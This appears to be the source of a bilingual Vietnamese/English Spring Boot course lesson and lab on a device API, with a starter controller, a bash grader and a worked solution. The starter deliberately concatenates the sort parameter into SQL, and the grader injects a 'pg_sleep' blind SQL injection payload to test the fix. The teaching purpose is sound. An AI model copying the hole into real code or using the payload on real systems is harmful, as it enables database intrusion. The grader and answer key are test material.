<p>Client bỏ cuộc sau 100&nbsp;ms, nhưng server đã nhận request và làm xong 200&nbsp;ms sau đó. Không có khoá, lần thử lại tạo ra <strong>lượt đặt thứ hai</strong>. Có khoá, lần thử lại trả về lượt đặt đầu (<code>1000003</code>), đánh dấu là phát lại — một dòng. Dùng lại khoá với giờ bắt đầu khác thì bị từ chối.</p>
${OUT45_RACE}
<p>Mười request cùng lúc với cùng một khoá: một 201, chín 409 (chúng tới khi request đầu còn đang làm, và nên thử lại sau để nhận bản phát lại), một dòng trong bảng. Không có khoá: mười dòng — đúng cảnh bấm hai lần trên điện thoại chậm. Ở production bạn còn cho khoá cũ hết hạn (ví dụ sau 24 giờ) và gắn khoá với người dùng, để người này không đọc được bản phát lại của người khác.</p>

<h3>So với Node.js</h3>
<p>Khoá API &amp; System Design dựng cùng Idempotency-Key bằng một middleware Express (bài 5.1) và phân trang offset/con trỏ với cùng các số đo PostgreSQL (Chương 3). Cơ chế y hệt — cơ sở dữ liệu làm phần khó (khoá chính cho cuộc đua, chỉ mục cho con trỏ). Khác biệt ở framework: Spring cho bạn <code>@RequestParam int size</code> có kiểu (rác ⇒ 400 miễn phí), Express cho bạn chuỗi phải tự kiểm; <code>DuplicateKeyException</code> của Spring giấu mã lỗi PostgreSQL mà mã Node phải tự kiểm (<code>err.code === '23505'</code>).</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li><strong>API thanh toán</strong> như Stripe nhận header <code>Idempotency-Key</code> cho thao tác tạo mới chính vì lý do này — thử lại trên mạng di động là chuyện bình thường, không phải ngoại lệ. Hãy thiết kế API đặt lịch của bạn y như vậy.</li>
  <li><strong>"Bảng quản trị chậm ở trang cuối"</strong>: đó là <code>OFFSET</code>. Chuyển màn xuất dữ liệu và màn cuộn vô hạn sang con trỏ; chỉ giữ số trang ở chỗ con người thật sự bấm số trang.</li>
  <li><strong>Cờ đỏ khi review mã:</strong> bất kỳ <code>+ sort +</code>, <code>+ order +</code> hay <code>+ size</code> nào trong chuỗi SQL; một endpoint trả danh sách không giới hạn; <code>if (!exists) insert</code> để bảo đảm duy nhất.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"POST tạo tài nguyên nên trả gì?"</strong> — 201 Created, header <code>Location</code> trỏ tới URL của tài nguyên mới, thường kèm bản thể hiện vừa tạo trong body.</li>
  <li><strong>"Phân trang offset khác con trỏ thế nào?"</strong> — Offset: truy cập ngẫu nhiên và có tổng, nhưng chi phí tăng theo độ sâu và trang bị xô khi có dòng mới. Con trỏ/keyset: <code>WHERE (khoá) &gt; cuối</code> trên chỉ mục, chi phí không đổi, ổn định, nhưng chỉ có trang trước/sau. Luôn thêm một cột duy nhất để phá hoà khi sắp xếp.</li>
  <li><strong>"Làm POST idempotent thế nào?"</strong> — Client gửi <code>Idempotency-Key</code>; server giành khoá một cách nguyên tử (ràng buộc unique), lưu response, phát lại khi thử lại, từ chối dùng lại khoá với body khác, cho khoá hết hạn.</li>
  <li><strong>"Dùng tham số của prepared statement cho ORDER BY được không?"</strong> — Không, tên định danh không gắn tham số được; ánh xạ đầu vào người dùng sang danh sách trắng các cột đã biết.</li>
  <li><strong>"409, 422, 400 khác nhau thế nào?"</strong> — 400 request sai định dạng/không hợp lệ; 422 đúng định dạng nhưng không xử lý được về mặt ngữ nghĩa; 409 xung đột với trạng thái hiện tại (trùng, lệch phiên bản).</li>
</ol>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok"><ol>
  <li>Thêm <code>GET /bookings/timeline?cursor=…&amp;size=…</code>: các lượt đặt theo thứ tự <code>start_at</code>, dùng phân trang keyset.</li>
  <li>Nhiều lượt đặt trùng <code>start_at</code> — không lượt nào được bị sót hay lặp giữa các trang.</li>
  <li>Con trỏ phải mờ với client (client không tự dựng nó được).</li>
</ol>
<p><strong>Đạt khi:</strong> đi theo <code>nextCursor</code> cho các trang liên tiếp không trùng, và một con trỏ ở gần cuối một triệu dòng vẫn trả lời trong vài mili giây.</p></div>
${giai('Xem một lời giải', `${MA45_GIAI}
${OUT45_GIAI}
<p>Con trỏ là cặp <em>(start_at, id)</em> của dòng cuối; PostgreSQL so sánh giá trị hàng <code>(start_at, id) &gt; (?, ?)</code> theo thứ tự từ điển, nên các dòng cùng giờ được xếp theo id và không dòng nào bị mất. Base64 làm con trỏ thành mờ — sau này đổi nội dung bên trong mà không làm hỏng client. Thêm chỉ mục trên <code>(start_at, id)</code> (lược đồ đã có) để truy vấn chỉ là một lần quét đoạn chỉ mục.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Header Location</span><span class="v">Nơi tài nguyên vừa tạo nằm; gửi kèm 201.</span></div>
  <div class="kv"><span class="k">Phân trang offset</span><span class="v"><code>LIMIT n OFFSET k</code>; truy cập ngẫu nhiên, chi phí tăng theo k.</span></div>
  <div class="kv"><span class="k">Phân trang keyset / con trỏ</span><span class="v"><code>WHERE khoá &gt; cuối ORDER BY khoá LIMIT n</code>; chi phí không đổi, chỉ có trang tiếp.</span></div>
  <div class="kv"><span class="k">Cột phá hoà</span><span class="v">Một cột duy nhất thêm vào phần sắp xếp để thứ tự đầy đủ và ổn định.</span></div>
  <div class="kv"><span class="k">Idempotency-Key</span><span class="v">Khoá do client chọn, giúp server nhận ra và phát lại một request không idempotent bị gửi lại.</span></div>
  <div class="kv"><span class="k">Chèn SQL mù</span><span class="v">Rút dữ liệu qua tác dụng phụ có/không (thời gian) thay vì output nhìn thấy.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>201 + Location tuyệt đối, 204, 404, 409 từ ràng buộc cơ sở dữ liệu — để PostgreSQL phân xử các cuộc đua.</li>
  <li>Giới hạn cỡ trang, danh sách trắng cho trường sắp xếp, thêm cột phá hoà; dùng con trỏ cho danh sách sâu hoặc vô hạn (132&nbsp;ms so với 0,045&nbsp;ms).</li>
  <li>Tham số sort nối vào SQL là một lỗ chèn SQL mù đầy đủ; size không giới hạn là một cách đánh sập dịch vụ.</li>
  <li>Idempotency-Key + khoá chính làm 10 lần thử lại song song chỉ tạo đúng một lượt đặt.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://www.rfc-editor.org/rfc/rfc9110#name-status-codes', '📜', 'RFC 9110 — Mã trạng thái HTTP', 'Định nghĩa gốc của 201, 204, 400, 404, 405, 406, 409, 415, 422.')}
${tl('https://use-the-index-luke.com/no-offset', '🐘', 'Use The Index, Luke — No offset', 'Vì sao OFFSET chậm và phân trang keyset chạy thế nào với giá trị hàng.')}

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: RestApp và GiaiApp trên Spring Boot 4.1.2 với PostgreSQL 16, 1 000 000 lượt đặt sinh tự động, Temurin 21.0.12.1 (19/11/2026).</li>
  <li>iTnews, "Optus to answer privacy court case stemming from 2022 data breach" (08/08/2025): <a href="https://www.itnews.com.au/news/optus-to-answer-privacy-court-case-stemming-from-2022-data-breach-619417" target="_blank" rel="noopener">itnews.com.au</a>; vụ kiện dân sự của OAIC với Optus (9,5 triệu người Úc).</li>
</ul>
</div>
`;

// ===== Bài 4.6 =====
const XML46_POM = xml("  <parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>4.1.2</version>\n    <relativePath/>\n  </parent>\n  <groupId>com.cuongthai</groupId>\n  <artifactId>lab4</artifactId>\n  <version>0.0.1</version>\n  <properties><java.version>21</java.version></properties>\n  <dependencies>\n    <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-webmvc</artifactId></dependency>\n    <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-jdbc</artifactId></dependency>\n    <dependency><groupId>org.postgresql</groupId><artifactId>postgresql</artifactId><scope>runtime</scope></dependency>\n  </dependencies>\n  <build>\n    <plugins>\n      <plugin><groupId>org.springframework.boot</groupId><artifactId>spring-boot-maven-plugin</artifactId></plugin>\n    </plugins>\n  </build>\n</project>");
const PROPS46 = props("spring.main.banner-mode=off\nspring.datasource.url=jdbc:postgresql://localhost:5432/labflow\nspring.datasource.username=postgres\nspring.datasource.password=sb");
const SQL46 = sql("DROP TABLE IF EXISTS devices, labs;\nCREATE TABLE labs (id bigserial PRIMARY KEY, code text NOT NULL UNIQUE, name text NOT NULL);\nINSERT INTO labs(code, name) VALUES ('AI-01','Lab AI'), ('NET-03','Lab Mạng');\nCREATE TABLE devices (\n  id             bigserial PRIMARY KEY,\n  lab_id         bigint NOT NULL REFERENCES labs,\n  name           text NOT NULL,\n  type           text NOT NULL,\n  serial_no      text NOT NULL UNIQUE,\n  status         text NOT NULL DEFAULT 'AVAILABLE',\n  internal_note  text,                 -- ghi chú nội bộ của quản lý lab: KHÔNG cho sinh viên xem\n  purchase_price numeric(12,0)         -- giá mua: KHÔNG cho sinh viên xem\n);\nINSERT INTO devices(lab_id, name, type, serial_no, status, internal_note, purchase_price)\nSELECT 1 + g % 2, 'Thiết bị ' || g, (ARRAY['ROUTER','SWITCH','BOARD','PC'])[1 + g % 4], 'SN-' || (1000 + g),\n       'AVAILABLE', 'Tủ ' || (g % 9), 15000000 + g * 1000\nFROM generate_series(1, 120) g;");
const MA46_APP = java("@SpringBootApplication\npublic class Lab4App {\n    public static void main(String[] args) {\n        SpringApplication.run(Lab4App.class, args);\n    }\n}");
const MA46_DEVICE = java("/** Một hàng của bảng devices. */\npublic class Device {\n    private Long id;\n    private Long labId;\n    private String name;\n    private String type;\n    private String serialNo;\n    private String status;\n    private String internalNote;\n    private BigDecimal purchasePrice;\n}\n// + getter/setter cho cả 8 trường (có trong tệp khởi đầu)");
const MA46_START = java("/** Bản KHỞI ĐẦU của Lab 4 — chạy được, nhưng sai hợp đồng ở nhiều chỗ. Đừng sửa cham.sh, sửa tệp này (và thêm tệp mới). */\n@RestController\npublic class DeviceController {\n    private final JdbcClient db;\n\n    DeviceController(JdbcClient db) { this.db = db; }\n\n    private static final String COLS = \"id, lab_id, name, type, serial_no, status, internal_note, purchase_price\";\n\n    @GetMapping(\"/labs/{labId}/devices\")\n    public List<Device> list(@PathVariable long labId,\n                             @RequestParam(defaultValue = \"20\") int size,\n                             @RequestParam(defaultValue = \"0\") int page,\n                             @RequestParam(defaultValue = \"id\") String sort) {\n        return db.sql(\"SELECT \" + COLS + \" FROM devices WHERE lab_id = ? ORDER BY \" + sort + \" LIMIT ? OFFSET ?\")\n                .params(labId, size, page * size).query(Device.class).list();\n    }\n\n    @GetMapping(\"/devices/{id}\")\n    public Device one(@PathVariable long id) {\n        return db.sql(\"SELECT \" + COLS + \" FROM devices WHERE id = ?\").param(id).query(Device.class).single();\n    }\n\n    @PostMapping(\"/labs/{labId}/devices\")\n    public Device create(@PathVariable long labId, @RequestBody Device d) {\n        d.setLabId(labId);\n        if (d.getStatus() == null) d.setStatus(\"AVAILABLE\");\n        Long id = db.sql(\"INSERT INTO devices(lab_id, name, type, serial_no, status) VALUES (?, ?, ?, ?, ?) RETURNING id\")\n                .params(d.getLabId(), d.getName(), d.getType(), d.getSerialNo(), d.getStatus()).query(Long.class).single();\n        if (d.getId() == null) d.setId(id);\n        return d;\n    }\n\n    @DeleteMapping(\"/devices/{id}\")\n    public String delete(@PathVariable long id) {\n        db.sql(\"DELETE FROM devices WHERE id = ?\").param(id).update();\n        return \"deleted\";\n    }\n}");
const BASH46_CHAM = bash("#!/bin/bash\n# cham.sh [cổng=41860] — bộ chấm Lab 4: 8 mục, chạy với ứng dụng đang chạy + PostgreSQL vừa nạp schema.sql\nH=localhost:${1:-41860}; J='Content-Type: application/json'; pass=0\nok() { echo \"PASS $1\"; pass=$((pass+1)); }; ko() { echo \"FAIL $1 — $2\"; }\n# 1) POST ⇒ 201 + Location /devices/{id}\nr=$(curl -s -i -X POST $H/labs/1/devices -H \"$J\" -d '{\"name\":\"Router A\",\"type\":\"ROUTER\",\"serialNo\":\"SN-T1\"}' | tr -d '\\r')\ncode=$(echo \"$r\" | head -1 | awk '{print $2}'); loc=$(echo \"$r\" | grep -i '^Location:' | awk '{print $2}')\nfollow=000; [[ -n $loc ]] && follow=$(curl -s -o /dev/null -w '%{http_code}' \"$loc\")\n[[ $code == 201 && $loc =~ /devices/[0-9]+$ && $follow == 200 ]] && ok \"1 POST trả 201 + Location dùng được\" || ko \"1 POST trả 201 + Location dùng được\" \"nhận $code, Location='$loc', GET Location ⇒ $follow\"\n# 2) GET /devices/{id} không lộ trường nội bộ\nb=$(curl -s $H/devices/1)\n[[ $b == *serialNo* && $b != *internalNote* && $b != *purchasePrice* && $b != *internal_note* && $b != *purchase_price* ]] && ok \"2 không lộ ghi chú nội bộ / giá mua\" || ko \"2 không lộ ghi chú nội bộ / giá mua\" \"${b:0:160}\"\n# 3) mass assignment: client gửi id + status thì bị bỏ qua\nb=$(curl -s -X POST $H/labs/1/devices -H \"$J\" -d '{\"id\":999,\"name\":\"Switch B\",\"type\":\"SWITCH\",\"serialNo\":\"SN-T2\",\"status\":\"MAINTENANCE\"}')\n[[ $b == *'\"status\":\"AVAILABLE\"'* && $b != *'\"id\":999'* ]] && ok \"3 bỏ qua id/status do client gửi\" || ko \"3 bỏ qua id/status do client gửi\" \"${b:0:160}\"\n# 4) trùng serialNo ⇒ 409\ncode=$(curl -s -o /dev/null -w '%{http_code}' -X POST $H/labs/1/devices -H \"$J\" -d '{\"name\":\"Trùng\",\"type\":\"PC\",\"serialNo\":\"SN-T1\"}')\n[[ $code == 409 ]] && ok \"4 trùng serialNo ⇒ 409\" || ko \"4 trùng serialNo ⇒ 409\" \"nhận $code\"\n# 5) size bị chặn ≤ 50 và có phong bì trang\nb=$(curl -s \"$H/labs/1/devices?size=1000\")\nn=$(echo \"$b\" | python3 -c 'import sys,json\ntry:\n  d=json.load(sys.stdin); print(len(d[\"items\"]) if isinstance(d,dict) and \"items\" in d and \"totalItems\" in d else -1)\nexcept Exception: print(-1)')\n[[ $n -ge 1 && $n -le 50 ]] && ok \"5 size ≤ 50, có items + totalItems\" || ko \"5 size ≤ 50, có items + totalItems\" \"số phần tử/phong bì = $n\"\n# 6) lab không tồn tại ⇒ 404\ncode=$(curl -s -o /dev/null -w '%{http_code}' $H/labs/999/devices)\n[[ $code == 404 ]] && ok \"6 lab không tồn tại ⇒ 404\" || ko \"6 lab không tồn tại ⇒ 404\" \"nhận $code\"\n# 7) DELETE ⇒ 204, sau đó GET ⇒ 404\nc1=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE $H/devices/2); c2=$(curl -s -o /dev/null -w '%{http_code}' $H/devices/2)\n[[ $c1 == 204 && $c2 == 404 ]] && ok \"7 DELETE 204, GET sau đó 404\" || ko \"7 DELETE 204, GET sau đó 404\" \"nhận $c1 rồi $c2\"\n# 8) sort lạ bị từ chối (không chạy được SQL chèn vào)\nt=$(curl -s -o /tmp/cham8.$$ -w '%{http_code} %{time_total}' -G $H/labs/1/devices --data-urlencode 'sort=(SELECT 1 FROM pg_sleep(2))')\n[[ ${t%% *} == 400 && $(echo \"${t##* } < 1\" | bc) == 1 ]] && ok \"8 sort ngoài danh sách trắng ⇒ 400\" || ko \"8 sort ngoài danh sách trắng ⇒ 400\" \"nhận $t s\"\nrm -f /tmp/cham8.$$\necho \"== $pass/8 ==\"");
const OUT46_START = out("$ bash cham.sh 8080      # với tệp khởi đầu\nFAIL 1 POST trả 201 + Location dùng được — nhận 200, Location='', GET Location ⇒ 000\nFAIL 2 không lộ ghi chú nội bộ / giá mua — {\"id\":1,\"internalNote\":\"Tủ 1\",\"labId\":2,\"name\":\"Thiết bị 1\",\"purchasePrice\":15001000,\"serialNo\":\"SN-1001\",\"status\":\"AVAILABLE\",\"type\":\"SWITCH\"}\nFAIL 3 bỏ qua id/status do client gửi — {\"id\":999,\"internalNote\":null,\"labId\":1,\"name\":\"Switch B\",\"purchasePrice\":null,\"serialNo\":\"SN-T2\",\"status\":\"MAINTENANCE\",\"type\":\"SWITCH\"}\nFAIL 4 trùng serialNo ⇒ 409 — nhận 500\nFAIL 5 size ≤ 50, có items + totalItems — số phần tử/phong bì = -1\nFAIL 6 lab không tồn tại ⇒ 404 — nhận 200\nFAIL 7 DELETE 204, GET sau đó 404 — nhận 200 rồi 500\nFAIL 8 sort ngoài danh sách trắng ⇒ 400 — nhận 200 2.005914 s\n== 0/8 ==");
const OUT46_BAY = out("# lời giải đúng, chỉ đổi dòng Location sang ServletUriComponentsBuilder.fromCurrentRequest().path(\"/{id}\")\n$ bash cham.sh 8080\nFAIL 1 POST trả 201 + Location dùng được — nhận 201, Location='http://localhost:8080/labs/1/devices/121', GET Location ⇒ 404\nPASS 2 không lộ ghi chú nội bộ / giá mua\nPASS 3 bỏ qua id/status do client gửi\nPASS 4 trùng serialNo ⇒ 409\nPASS 5 size ≤ 50, có items + totalItems\nPASS 6 lab không tồn tại ⇒ 404\nPASS 7 DELETE 204, GET sau đó 404\nPASS 8 sort ngoài danh sách trắng ⇒ 400\n== 7/8 ==");
const MA46_DTOS = java("/** Hợp đồng API của Lab 4 — tách khỏi hình dạng bảng devices. */\npublic final class DeviceDtos {\n    private DeviceDtos() {}\n\n    /** Client chỉ được gửi 3 trường này. id, status, labId do server quyết. */\n    public record CreateDeviceRequest(String name, String type, String serialNo) {}\n\n    /** Thứ client được thấy: không có internal_note, purchase_price. */\n    public record DeviceResponse(long id, long labId, String name, String type, String serialNo, String status) {}\n\n    public record PageResponse<T>(List<T> items, int page, int size, long totalItems) {}\n}");
const MA46_GIAI = java("@RestController\npublic class DeviceController {\n    private final JdbcClient db;\n\n    DeviceController(JdbcClient db) { this.db = db; }\n\n    private static final String COLS = \"id, lab_id, name, type, serial_no, status\";        // chỉ cột công khai\n    private static final Map<String, String> SORTABLE = Map.of(\"id\", \"id\", \"name\", \"name\", \"type\", \"type\");\n\n    @GetMapping(\"/labs/{labId}/devices\")\n    public ResponseEntity<PageResponse<DeviceResponse>> list(@PathVariable long labId,\n                                                             @RequestParam(defaultValue = \"20\") int size,\n                                                             @RequestParam(defaultValue = \"0\") int page,\n                                                             @RequestParam(defaultValue = \"id\") String sort) {\n        if (!labExists(labId)) return ResponseEntity.notFound().build();\n        String col = SORTABLE.get(sort);\n        if (col == null) return ResponseEntity.badRequest().build();\n        size = Math.clamp(size, 1, 50);\n        page = Math.max(page, 0);\n        var items = db.sql(\"SELECT \" + COLS + \" FROM devices WHERE lab_id = ? ORDER BY \" + col + \", id LIMIT ? OFFSET ?\")\n                .params(labId, size, (long) page * size).query(DeviceResponse.class).list();\n        long total = db.sql(\"SELECT count(*) FROM devices WHERE lab_id = ?\").param(labId).query(Long.class).single();\n        return ResponseEntity.ok(new PageResponse<>(items, page, size, total));\n    }\n\n    @GetMapping(\"/devices/{id}\")\n    public ResponseEntity<DeviceResponse> one(@PathVariable long id) {\n        return ResponseEntity.of(db.sql(\"SELECT \" + COLS + \" FROM devices WHERE id = ?\")\n                .param(id).query(DeviceResponse.class).optional());\n    }\n\n    @PostMapping(\"/labs/{labId}/devices\")\n    public ResponseEntity<DeviceResponse> create(@PathVariable long labId, @RequestBody CreateDeviceRequest req) {\n        if (!labExists(labId)) return ResponseEntity.notFound().build();\n        DeviceResponse d = db.sql(\"INSERT INTO devices(lab_id, name, type, serial_no) VALUES (?, ?, ?, ?) RETURNING \" + COLS)\n                .params(labId, req.name(), req.type(), req.serialNo()).query(DeviceResponse.class).single();\n        URI location = ServletUriComponentsBuilder.fromCurrentContextPath().path(\"/devices/{id}\").buildAndExpand(d.id()).toUri();\n        return ResponseEntity.created(location).body(d);\n    }\n\n    @DeleteMapping(\"/devices/{id}\")\n    public ResponseEntity<Void> delete(@PathVariable long id) {\n        int n = db.sql(\"DELETE FROM devices WHERE id = ?\").param(id).update();\n        return n == 0 ? ResponseEntity.notFound().build() : ResponseEntity.noContent().build();\n    }\n\n    @ExceptionHandler(DuplicateKeyException.class)\n    public ResponseEntity<Map<String, String>> duplicate() {\n        return ResponseEntity.status(409).body(Map.of(\"error\", \"serialNo already exists\"));\n    }\n\n    private boolean labExists(long labId) {\n        return db.sql(\"SELECT count(*) FROM labs WHERE id = ?\").param(labId).query(Long.class).single() > 0;\n    }\n}");
const OUT46_GIAI = out("$ bash cham.sh 8080      # lần thứ 3 liên tiếp, mỗi lần nạp lại schema.sql\nPASS 1 POST trả 201 + Location dùng được\nPASS 2 không lộ ghi chú nội bộ / giá mua\nPASS 3 bỏ qua id/status do client gửi\nPASS 4 trùng serialNo ⇒ 409\nPASS 5 size ≤ 50, có items + totalItems\nPASS 6 lab không tồn tại ⇒ 404\nPASS 7 DELETE 204, GET sau đó 404\nPASS 8 sort ngoài danh sách trắng ⇒ 400\n== 8/8 ==");

const L46_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lab</span>
<h2>Lab 4 — the LabFlow device API, done properly</h2>
<p class="lead">LabFlow needs an API for the devices in each lab: routers, switches, boards, PCs. A teammate wrote a first version that "works" — it returns data and accepts data. It also leaks the purchase price, lets a student set a device's status, answers 500 to a duplicate serial number, returns a million rows if asked, and lets anyone run SQL through the sort parameter. Your job is to make it honour the contract below, using everything from Chapter 4. A grader with eight checks runs against the real application and PostgreSQL; the starter scores <strong>0/8</strong>.</p>

<h3>The contract</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">GET /labs/{labId}/devices?page&amp;size&amp;sort</span><span class="v">200 with <code>{items, page, size, totalItems}</code>; <code>size</code> capped at 50; <code>sort</code> ∈ <code>id</code>, <code>name</code>, <code>type</code> (anything else ⇒ 400); unknown lab ⇒ 404.</span></div>
  <div class="kv"><span class="k">GET /devices/{id}</span><span class="v">200 with <code>id, labId, name, type, serialNo, status</code> — never <code>internal_note</code> or <code>purchase_price</code>; unknown ⇒ 404.</span></div>
  <div class="kv"><span class="k">POST /labs/{labId}/devices</span><span class="v">Body <code>{name, type, serialNo}</code>. 201 + a <code>Location</code> header that a client can GET. <code>id</code>, <code>status</code> (always <code>AVAILABLE</code>) and <code>labId</code> are decided by the server. Duplicate <code>serialNo</code> ⇒ 409.</span></div>
  <div class="kv"><span class="k">DELETE /devices/{id}</span><span class="v">204; afterwards GET ⇒ 404.</span></div>
</div>

<h3>Setup</h3>
<ul>
  <li>Java 21, Maven, Docker, and a shell with <code>curl</code>, <code>python3</code> and <code>bc</code> for the grader (Linux, macOS, WSL or Git Bash).</li>
  <li>Start PostgreSQL and load the data: <code>docker run -d --name labflow-pg -e POSTGRES_PASSWORD=sb -e POSTGRES_DB=labflow -p 5432:5432 postgres:16</code>, then <code>docker exec -i labflow-pg psql -U postgres -d labflow &lt; schema.sql</code>. <strong>Reload <code>schema.sql</code> before every grading run</strong> — the grader creates and deletes devices.</li>
  <li>Run the app: <code>mvn spring-boot:run</code>; in another terminal: <code>bash cham.sh 8080</code>.</li>
  <li>Change <code>DeviceController</code> and add new files as you like. Do not change <code>schema.sql</code> or <code>cham.sh</code>.</li>
</ul>
${XML46_POM}
${PROPS46}
${SQL46}
${MA46_APP}
${MA46_DEVICE}
${MA46_START}
${giai('The grader — cham.sh (read it, do not change it)', BASH46_CHAM)}
<p>Running the starter as it is:</p>
${OUT46_START}

<h3>The eight checks, and which lesson each one comes from</h3>
<ol>
  <li><strong>201 + a Location you can follow</strong> — lessons 4.1 and 4.5. The grader GETs the URL in the header.</li>
  <li><strong>No internal fields</strong> — lesson 4.2: a response DTO, not the <code>Device</code> class.</li>
  <li><strong>Mass assignment blocked</strong> — lesson 4.2: the client sends <code>"id":999</code> and <code>"status":"MAINTENANCE"</code>; the created device must have a server id and <code>AVAILABLE</code>.</li>
  <li><strong>Duplicate serial ⇒ 409</strong> — lesson 4.5: let the <code>UNIQUE</code> constraint decide, translate the exception.</li>
  <li><strong>Bounded page with an envelope</strong> — lesson 4.5.</li>
  <li><strong>Unknown lab ⇒ 404</strong> — an empty list would say "this lab has no devices", which is a different fact.</li>
  <li><strong>DELETE ⇒ 204, then 404</strong> — lessons 4.1 and 4.5 (a missing row must not become 500).</li>
  <li><strong>Sort whitelist</strong> — lesson 4.5: the grader sends <code>(SELECT 1 FROM pg_sleep(2))</code> and expects a 400 in under a second.</li>
</ol>

<h3>Done when</h3>
<p><code>== 8/8 ==</code> three times in a row, reloading <code>schema.sql</code> before each run.</p>

<h3>Rubric (10 points)</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Correctness — 6 pts</span><span class="v">8/8 three times: 6 points; 7/8: 4; 6/8: 3; fewer: 1 per two PASS.</span></div>
  <div class="kv"><span class="k">DTO design — 2 pts</span><span class="v">Separate request and response records; no class that maps the table appears in a controller signature; the request record has exactly the fields a client may send.</span></div>
  <div class="kv"><span class="k">Let the database decide — 1 pt</span><span class="v">Duplicates detected by the constraint (no SELECT-then-INSERT); the sort column comes from a map, never from string concatenation.</span></div>
  <div class="kv"><span class="k">HTTP hygiene — 1 pt</span><span class="v">Statuses built with <code>ResponseEntity</code> (no 200 with an error message inside), Location built from the request, not hard-coded <code>http://localhost:8080</code>.</span></div>
</div>

<h3>Traps we saw while testing the lab</h3>
<p><strong>A Location that looks right.</strong> The most natural line, <code>ServletUriComponentsBuilder.fromCurrentRequest().path("/{id}")</code>, appends the id to the <em>current</em> URL — which for this endpoint is <code>/labs/1/devices</code>:</p>
${OUT46_BAY}
<p>Every other check passes, the header ends in <code>/devices/121</code> and looks fine in a quick glance — but nobody can GET it. That is why the grader follows the link. Build the URL of the resource itself (<code>fromCurrentContextPath()</code> + <code>/devices/{id}</code>).</p>
<ul>
  <li><strong><code>.single()</code> on a missing row</strong> throws <code>EmptyResultDataAccessException</code> ⇒ 500 (check 7 of the starter). Use <code>.optional()</code> and <code>ResponseEntity.of(…)</code>.</li>
  <li><strong>Checking the lab only in GET</strong>: POST to an unknown lab hits the foreign key and gives 500 unless you check it or translate <code>DataIntegrityViolationException</code>.</li>
  <li><strong>Forgetting the tie-breaker</strong> when sorting by <code>type</code>: each lab has 15 devices of each type, so pages overlap (lesson 4.5). The grader does not catch it; your rubric reviewer will.</li>
</ul>

<h3>Stretch (optional)</h3>
<ul>
  <li><code>PATCH /devices/{id}</code> with <code>{status}</code> only for <code>AVAILABLE</code>, <code>IN_USE</code>, <code>MAINTENANCE</code> (400 otherwise).</li>
  <li><code>GET /admin/devices/{id}</code> returning a second DTO with the purchase price (Chapter 9 will protect it).</li>
  <li>Keyset pagination for the device list, with an opaque cursor.</li>
  <li>The same contract in Express 5 — then compare how many lines each version needed for checks 2, 3 and 8.</li>
</ul>

${giai('Show one solution', `${MA46_DTOS}
${MA46_GIAI}
${OUT46_GIAI}`)}

<h3>🎤 Chapter 4 — what the interviewer will ask</h3>
<ol>
  <li><strong>"Walk me through what happens between an HTTP request arriving and your controller method running."</strong> — Tomcat worker thread ⇒ servlet filters (including Spring Security) ⇒ DispatcherServlet ⇒ handler mapping (most specific pattern) ⇒ interceptors ⇒ argument resolution and message converters (Jackson) ⇒ your method ⇒ return value converted by content negotiation ⇒ exception resolvers / advice ⇒ back through interceptors and filters.</li>
  <li><strong>"Why DTOs? Isn't it duplicate code?"</strong> — DTOs are the API contract: they decide exposure (no internal fields), writability (no mass assignment), stability (schema changes don't break clients) and avoid serialisation traps (cycles, lazy loading). MapStruct removes most of the duplication.</li>
  <li><strong>"Which status codes do you use for create, update, delete, validation error, duplicate, not found?"</strong> — 201 + Location; 200 (or 204); 204; 400 (or 422 for semantic errors); 409; 404 — plus 401/403 for auth, 405/406/415 that Spring produces for you.</li>
  <li><strong>"How do you paginate a large table?"</strong> — Bounded page size, deterministic sort with a unique tie-breaker, whitelisted sort fields; offset for small/admin lists, keyset cursor for large or infinite ones; consider dropping or caching <code>count(*)</code>.</li>
  <li><strong>"A mobile client retries a POST after a timeout and the user gets two bookings. How do you fix it?"</strong> — Idempotency-Key: claim it atomically with a unique constraint, store and replay the response, reject reuse with a different body, expire keys; also a business constraint (one booking per slot) as the last line of defence.</li>
</ol>

<h3>Sources</h3>
<ul>
  <li>Outputs above: Lab4App (starter, solution, trap variant) on Spring Boot 4.1.2 with PostgreSQL 16, Temurin 21.0.12.1; graded with <code>cham.sh</code> (19/11/2026). The solution passed 8/8 in three consecutive runs.</li>
</ul>
</div>
`;

const L46_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Lab</span>
<h2>Lab 4 — API thiết bị của LabFlow, làm cho đúng</h2>
<p class="lead">LabFlow cần một API cho thiết bị trong từng lab: router, switch, bo mạch, máy tính. Một bạn cùng nhóm đã viết bản đầu "chạy được" — nó trả dữ liệu và nhận dữ liệu. Nó cũng làm lộ giá mua, cho sinh viên tự đặt trạng thái thiết bị, trả 500 khi trùng số serial, trả một triệu dòng nếu được hỏi, và cho bất kỳ ai chạy SQL qua tham số sort. Việc của bạn là làm nó đúng hợp đồng bên dưới, dùng mọi thứ của Chương 4. Một bộ chấm tám mục chạy với ứng dụng thật và PostgreSQL; bản khởi đầu được <strong>0/8</strong>.</p>

<h3>Hợp đồng</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">GET /labs/{labId}/devices?page&amp;size&amp;sort</span><span class="v">200 với <code>{items, page, size, totalItems}</code>; <code>size</code> tối đa 50; <code>sort</code> ∈ <code>id</code>, <code>name</code>, <code>type</code> (khác ⇒ 400); lab không tồn tại ⇒ 404.</span></div>
  <div class="kv"><span class="k">GET /devices/{id}</span><span class="v">200 với <code>id, labId, name, type, serialNo, status</code> — không bao giờ có <code>internal_note</code> hay <code>purchase_price</code>; không có ⇒ 404.</span></div>
